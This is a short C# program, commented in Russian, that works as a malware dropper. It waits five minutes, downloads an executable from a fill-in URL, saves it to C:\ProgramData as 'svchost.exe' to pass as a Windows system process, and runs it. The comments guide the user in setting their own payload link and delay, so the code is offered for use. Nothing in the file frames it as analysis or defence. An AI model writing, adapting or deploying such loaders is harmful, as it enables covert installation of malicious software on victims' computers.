using System.Diagnostics;
using System.Net;
using System;
using System.Threading;

namespace DownloadFile
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient wc = new WebClient();

            // Ниже необходимо ввести прямую ссылку на ваш файл
            string url = "http://localhost/file.exe";

            // Куда будет скачиваться ваш файл и под каким названием?
            string save_path = "C:\\ProgramData\\";
            string name = "svchost.exe";

            // Через сколько МС (миллисекунд) запустится ваш файл?
            // 30 секунд - 30000 миллисекунд
            // 60 секунд - 60000 миллисекунд
            // 5 минут - 300000 миллисекунд
            Thread.Sleep(300000);

            // Если вы меняли местоположение загрузки, то поменяйте их ниже
            wc.DownloadFile(url, save_path + name);
            System.Diagnostics.Process.Start(@"C:\ProgramData\svchost.exe");
        }
    }
}
